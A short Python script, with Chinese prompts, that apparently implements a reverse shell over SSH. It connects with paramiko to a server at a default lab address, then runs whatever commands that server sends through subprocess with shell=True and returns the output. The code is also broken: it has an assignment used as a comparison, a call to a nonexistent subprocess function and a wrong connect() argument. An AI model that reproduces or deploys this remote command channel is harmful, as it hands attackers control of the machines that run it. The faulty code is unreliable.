import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, password, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip=ip, port=port, username=user, password=password)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd = "exit":
                    client.close()
                    break
                cmd_output = subprocess.checkout(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or "okay")
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return
    
if __name__ == "__main__":
    import getpass
    user = input("用户:")
    password = input("密码:")
    ip = input("服务器IP:") or "192.168.223.128"
    port = input("服务器IP端口:") or 22
    command = input("要执行的命令:") or "ClientConnected"
    ssh_command(ip, port, user, password, command)